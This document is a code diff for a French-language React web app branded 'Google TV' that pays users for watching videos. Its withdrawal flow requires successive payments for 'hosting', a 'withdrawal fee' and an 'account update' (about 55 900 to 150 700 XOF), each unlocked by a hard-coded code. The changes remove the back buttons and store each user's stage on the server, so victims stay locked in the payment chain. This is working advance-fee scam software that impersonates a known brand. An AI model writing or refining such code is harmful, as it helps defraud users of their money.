@@ -1,5 +1,5 @@
-import { useEffect, useMemo, useState, type ReactNode } from 'react';
-import { Banknote, Home, CheckCircle2, Clock3, Loader2, LogOut, Play, RefreshCw, RotateCcw, UserRound, Video, XCircle } from 'lucide-react';
+import { useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from 'react';
+import { ArrowDown, Banknote, Home, CheckCircle2, Clock3, Loader2, LogOut, Play, RefreshCw, RotateCcw, UserRound, Video, XCircle } from 'lucide-react';
 import VideoTab from '@/components/VideoTab';
 import { recommended } from '@/data/content';
 import { countries, getCountry, getPaymentMethods, getPlanRewardAmount, getPlanWithdrawalLimit } from '@/data/locations';
@@ -31,7 +31,8 @@ type ActivityKey = 'watched' | 'liked' | 'disliked' | 'favorited';
 
 const recommendationLabels = ['Recommandation 1', 'Recommandation 2', 'Recommandation 3', 'Recommandation 4'];
 
-type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; updateStep: boolean; withdrawalCode: string; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
+type WithdrawalStage = 'tax' | 'certification' | 'hosting' | 'hosted' | 'fee' | 'update';
+type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; feeValidation: boolean; updateStep: boolean; withdrawalCode: string; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
 const withdrawalFlowKey = (userId: string) => `gtv-withdrawal-flow-${userId}`;
 
 export default function UserHome({ profile, onSignOut }: UserHomeProps) {
@@ -110,7 +111,7 @@ export default function UserHome({ profile, onSignOut }: UserHomeProps) {
       {tab === 'profile' && <ProfileTab profile={profile} counts={counts} />}
       {activityError && <p className="fixed bottom-24 left-1/2 z-40 -translate-x-1/2 rounded-xl border border-red-400/30 bg-[#2a1720] px-4 py-3 text-sm text-red-200 shadow-xl">{activityError}</p>}
     </main>
-    <nav className="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#11151e]/95 px-3 py-3 shadow-[0_-12px_35px_rgba(0,0,0,.35)] backdrop-blur-xl"><div className="mx-auto grid max-w-2xl grid-cols-4 gap-2">{([{ id: 'home', label: 'Accueil', icon: Home }, { id: 'video', label: 'Vidéo', icon: Video }, { id: 'withdrawal', label: 'Retrait', icon: RotateCcw }, { id: 'profile', label: 'Profil', icon: UserRound }] as const).map(({ id, label, icon: Icon }) => <button key={id} onClick={() => { if (!withdrawalLocked || id === 'withdrawal') setTab(id); }} disabled={withdrawalLocked && id !== 'withdrawal'} className={`flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-xs font-semibold transition sm:text-sm ${tab === id ? 'text-blue-400' : 'text-slate-500 hover:bg-white/5 hover:text-slate-300'} disabled:cursor-not-allowed disabled:opacity-40`}><Icon className="h-6 w-6" strokeWidth={tab === id ? 2.5 : 2} /><span>{label}</span></button>)}</div></nav>
+    <nav className="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#11151e]/95 px-3 py-3 shadow-[0_-12px_35px_rgba(0,0,0,.35)] backdrop-blur-xl"><div className="mx-auto grid max-w-2xl grid-cols-4 gap-2">{([{ id: 'home', label: 'Accueil', icon: Home }, { id: 'video', label: 'Vidéo', icon: Video }, { id: 'withdrawal', label: 'Retrait', icon: ArrowDown }, { id: 'profile', label: 'Profil', icon: UserRound }] as const).map(({ id, label, icon: Icon }) => <button key={id} onClick={() => { if (!withdrawalLocked || id === 'withdrawal') setTab(id); }} disabled={withdrawalLocked && id !== 'withdrawal'} className={`flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-xs font-semibold transition sm:text-sm ${tab === id ? 'text-blue-400' : 'text-slate-500 hover:bg-white/5 hover:text-slate-300'} disabled:cursor-not-allowed disabled:opacity-40`}><Icon className="h-6 w-6" strokeWidth={tab === id ? 2.5 : 2} /><span>{label}</span></button>)}</div></nav>
   </div>;
 }
 
@@ -122,6 +123,9 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
   const flowKey = withdrawalFlowKey(profile.id);
   const savedFlow = (() => { try { const raw = window.localStorage.getItem(flowKey); return raw ? JSON.parse(raw) as WithdrawalFlowSnapshot : null; } catch { return null; } })();
   const savedWithdrawalCode = savedFlow?.withdrawalCode?.trim() ?? '';
+  const hasSavedFlow = Boolean(savedFlow && (savedFlow.codeStep || savedFlow.certificationBlocked || savedFlow.hostingStep || savedFlow.hostedSuccess || savedFlow.feeStep || savedFlow.feeValidation || savedFlow.updateStep));
+  const savedNeedsCertification = savedFlow?.certificationBlocked === true && Boolean(savedWithdrawalCode) && !profile.is_certified;
+  const savedHostingStep = Boolean(savedWithdrawalCode) && (savedFlow?.hostingStep === true || (profile.is_certified && savedFlow?.certificationBlocked === true));
   const [paymentMethod, setPaymentMethod] = useState(savedFlow?.paymentMethod ?? '');
   const [withdrawalCountry, setWithdrawalCountry] = useState(savedFlow?.withdrawalCountry ?? profile.country ?? '');
   const [amount, setAmount] = useState(savedFlow?.amount ?? '');
@@ -130,22 +134,24 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
   const taxPaidKey = `gtv-tax-paid-${profile.id}`;
   const [taxPaid, setTaxPaid] = useState(() => { try { return window.localStorage.getItem(taxPaidKey) === '1'; } catch { return false; } });
   const [codeStep, setCodeStep] = useState(false);
-  const [certificationBlocked, setCertificationBlocked] = useState(savedFlow?.certificationBlocked === true && Boolean(savedWithdrawalCode));
+  const [certificationBlocked, setCertificationBlocked] = useState(savedNeedsCertification);
   const [codeReady, setCodeReady] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [validating, setValidating] = useState(false);
   const [certChecked, setCertChecked] = useState(false);
   const [certifiedNow, setCertifiedNow] = useState(profile.is_certified);
-  const [hostingStep, setHostingStep] = useState(savedFlow?.hostingStep === true && Boolean(savedWithdrawalCode));
+  const [hostingStep, setHostingStep] = useState(savedHostingStep);
   const [hostingCode, setHostingCode] = useState('');
   const [hostingError, setHostingError] = useState<string | null>(null);
   const [withdrawalProcessing, setWithdrawalProcessing] = useState(false);
   const [hostedSuccess, setHostedSuccess] = useState(false);
-  const [feeStep, setFeeStep] = useState(savedFlow?.feeStep === true && Boolean(savedWithdrawalCode));
+  const [feeStep, setFeeStep] = useState((savedFlow?.feeStep === true || savedFlow?.feeValidation === true) && Boolean(savedWithdrawalCode));
   const [feeCode, setFeeCode] = useState('');
   const [feeError, setFeeError] = useState<string | null>(null);
   const [feeValidation, setFeeValidation] = useState(false);
   const [updateStep, setUpdateStep] = useState(savedFlow?.updateStep === true && Boolean(savedWithdrawalCode));
+  const [serverFlowLoaded, setServerFlowLoaded] = useState(false);
+  const flowMutationQueue = useRef(Promise.resolve());
   const [updateCode, setUpdateCode] = useState('');
   const [updateError, setUpdateError] = useState<string | null>(null);
   const [latestRequest, setLatestRequest] = useState<{ status: string; amount: number } | null>(null);
@@ -159,6 +165,20 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
   const dialCode = getCountry(withdrawalCountry)?.dialCode ?? '+';
   const earnedBalance = counts.rewarded * rewardAmount;
   const availableBalance = balanceReady ? Math.max(0, earnedBalance - committedAmount) : 0;
+
+  const activeStage: WithdrawalStage | null = codeStep ? 'tax' : certificationBlocked ? 'certification' : hostingStep ? 'hosting' : hostedSuccess ? 'hosted' : feeValidation || feeStep ? 'fee' : updateStep ? 'update' : null;
+
+  const queueFlowStage = useCallback((stage: WithdrawalStage | null): void => {
+    flowMutationQueue.current = flowMutationQueue.current.then(async () => {
+      if (stage) {
+        const { error } = await supabase.rpc('set_withdrawal_flow_state', { p_stage: stage });
+        if (error) console.error('withdrawal flow stage could not be saved', error);
+      } else {
+        const { error } = await supabase.rpc('clear_withdrawal_flow_state');
+        if (error) console.error('withdrawal flow stage could not be cleared', error);
+      }
+    });
+  }, []);
 
   useEffect(() => {
     let mounted = true;
@@ -196,6 +216,31 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
   }, [certificationBlocked, profile.id]);
 
   useEffect(() => {
+    let active = true;
+    const loadSavedStage = async () => {
+      const { data, error } = await supabase.rpc('get_withdrawal_flow_state');
+      if (!active) return;
+      if (!hasSavedFlow && !error && typeof data === 'string') {
+        if (data === 'tax') setCodeStep(true);
+        if (data === 'certification' && !profile.is_certified) setCertificationBlocked(true);
+        if (data === 'certification' && profile.is_certified) setHostingStep(true);
+        if (data === 'hosting') setHostingStep(true);
+        if (data === 'hosted') setHostedSuccess(true);
+        if (data === 'fee') setFeeStep(true);
+        if (data === 'update') setUpdateStep(true);
+      }
+      setServerFlowLoaded(true);
+    };
+    void loadSavedStage();
+    return () => { active = false; };
+  }, [hasSavedFlow, profile.id, profile.is_certified]);
+
+  useEffect(() => {
+    if (!serverFlowLoaded) return;
+    queueFlowStage(activeStage);
+  }, [activeStage, queueFlowStage, serverFlowLoaded]);
+
+  useEffect(() => {
     if (!codeStep) return undefined;
     setCodeReady(false);
     const timer = window.setTimeout(() => setCodeReady(true), 3000);
@@ -209,11 +254,11 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
   }, [latestRequest?.status]);
 
   useEffect(() => {
-    const flowActive = codeStep || certificationBlocked || hostingStep || hostedSuccess || feeStep || updateStep;
+    const flowActive = codeStep || certificationBlocked || hostingStep || hostedSuccess || feeStep || feeValidation || updateStep;
     if (!flowActive) { try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ } return; }
-    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone };
+    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, feeValidation, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone };
     try { window.localStorage.setItem(flowKey, JSON.stringify(snapshot)); } catch { /* stockage indisponible */ }
-  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone]);
+  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, feeValidation, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone]);
 
   const beginSubmit = () => {
     setErrorMessage(null);
@@ -251,8 +296,6 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
       setWithdrawalProcessing(false);
       if (!profile.is_certified) {
         setCertificationBlocked(true);
-      } else if (savedFlow?.updateStep === true) {
-        setUpdateStep(true);
       } else {
         setHostingStep(true);
       }
@@ -314,13 +357,13 @@ function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { pro
 
   if (feeValidation) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Validation en cours</h1><p className="mt-4 leading-7 text-slate-400">Vérification de vos frais de retrait…</p></div></section>;
 
-  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setErrorMessage(null); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button><button onClick={() => { setUpdateStep(false); setUpdateError(null); setFeeStep(true); }} disabled={submitting} className="mt-3 w-full rounded-2xl border border-white/10 px-5 py-3 text-sm font-semibold text-slate-300 hover:bg-white/5">Retour</button></div></div></section>;
+  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setErrorMessage(null); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button></div></div></section>;
 
   if (hostedSuccess) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Compte hébergé avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre compte Google TV a bien été hébergé. Vous pouvez poursuivre votre demande de retrait.</p><button onClick={() => { setHostedSuccess(false); setFeeCode(''); setFeeError(null); setFeeStep(true); }} className="primary-button mt-8 w-full rounded-2xl px-5 py-4 text-lg font-bold">Continuer</button></div></section>;
 
-  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">95 800 F CFA</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeeError(null); setFeeStep(false); setFeeValidation(true); window.setTimeout(() => { setFeeValidation(false); setUpdateCode(''); setUpdateError(null); setUpdateStep(true); }, 3000); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button><button onClick={() => { setFeeStep(false); setFeeError(null); setHostedSuccess(true); }} disabled={submitting} className="mt-3 w-full rounded-2xl border border-white/10 px-5 py-3 text-sm font-semibold text-slate-300 hover:bg-white/5">Retour</button></div></div></section>;
+  if (feeStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><Banknote className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez payer les frais de retrait afin que votre retrait soit effectué avec succès</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Frais de retrait</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">95 800 F CFA</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de frais de retrait"><input type="text" autoComplete="one-time-code" value={feeCode} onChange={(event) => { setFeeCode(event.target.value); setFeeError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{feeError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{feeError}</p>}<button onClick={() => { if (feeCode.trim().toUpperCase() === 'GTV-F95207') { setFeeError(null); setFeeStep(false); setFeeValidation(true); window.setTimeout(() => { setFeeValidation(false); setUpdateCode(''); setUpdateError(null); setUpdateStep(true); }, 3000); } else { setFeeError('Le code de frais de retrait est incorrect.'); } }} disabled={!feeCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Payer les frais et confirmer le retrait</button></div></div></section>;
 
-  if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-base font-black leading-7 text-white sm:text-lg">Nous vous recommandons de faire l'hébergement de votre compte Google TV avec une rechargement de <b>55 890 XOF</b> avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingStep(false); setHostingError(null); setHostedSuccess(true); } else { setHostingError('Le code d’hébergement est incorrect.'); } }} disabled={!hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Valider l'hébergement</button><button onClick={() => { setHostingStep(false); setHostingError(null); setCodeStep(true); }} disabled={submitting} className="mt-3 w-full rounded-2xl border border-white/10 px-5 py-3 text-sm font-semibold text-slate-300 hover:bg-white/5">Retour</button></div></div></section>;
+  if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-base font-black leading-7 text-white sm:text-lg">Nous vous recommandons de faire l'hébergement de votre compte Google TV avec une rechargement de <b>55 890 XOF</b> avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingStep(false); setHostingError(null); setHostedSuccess(true); } else { setHostingError('Le code d’hébergement est incorrect.'); } }} disabled={!hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Valider l'hébergement</button></div></div></section>;
 
   if (validating) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Envoi de votre demande</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;
 
